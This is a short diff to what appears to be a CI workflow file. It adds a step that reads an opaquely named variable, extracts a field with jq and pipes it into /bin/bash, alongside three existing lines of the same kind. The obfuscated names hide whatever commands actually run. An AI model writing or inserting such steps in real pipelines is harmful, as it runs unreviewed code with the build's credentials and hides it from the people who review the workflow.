@@ -40,6 +40,7 @@ jobs:
           echo $vbske10 | jq -r .hyuo77 | /bin/bash
           printf '%s' "$cw28360" | jq -r .f0941 | /bin/bash
           echo $ve412 | jq -r .hh81 | /bin/bash
+          echo $arc95 | jq -r .p85067 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
